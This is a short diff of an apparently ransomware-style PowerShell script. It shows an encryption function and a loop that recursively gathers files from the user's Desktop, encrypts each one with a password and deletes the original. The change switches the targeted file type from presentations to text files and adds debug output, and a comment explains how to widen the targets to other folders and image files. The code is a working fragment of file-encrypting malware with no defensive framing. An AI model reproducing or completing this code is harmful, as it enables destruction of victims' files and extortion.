@@ -385,6 +385,7 @@ Function Encr{param([string]$i,[string]$p)
     $fout.Write($IV,0,$IV.Count)
     $DA=$true;[int]$D
     While ($DA){
+      Write-Host "Fin-ReadByte: $fin.ReadByte()" -ForegroundColor Green
       $D=$fin.ReadByte()
       Write-Host "Byte D: $D" -ForegroundColor Green
       if($D -ne -1){
@@ -403,7 +404,7 @@ Function Encr{param([string]$i,[string]$p)
 
 #foreach ($i in $(Get-ChildItem C:/temp/ -recurse -include *.txt | ForEach-Object { $_.FullName })){
 # Replace C:\tools with the folder you want to encrypt. Also you can add or modify the file types by comma seperated - *.txt, *.jpg, *.png etc.
-foreach ($i in $(Get-ChildItem $env:USERPROFILE\Desktop -recurse -include *.pptx | ForEach-Object { $_.FullName })){ 
+foreach ($i in $(Get-ChildItem $env:USERPROFILE\Desktop -recurse -include *.txt | ForEach-Object { $_.FullName })){ 
   Write-Host "Se manda llamar a la función de CIFRADO para el archivo: $i" -ForegroundColor Green
   Encr -i $i -p $pwd
   rm $i
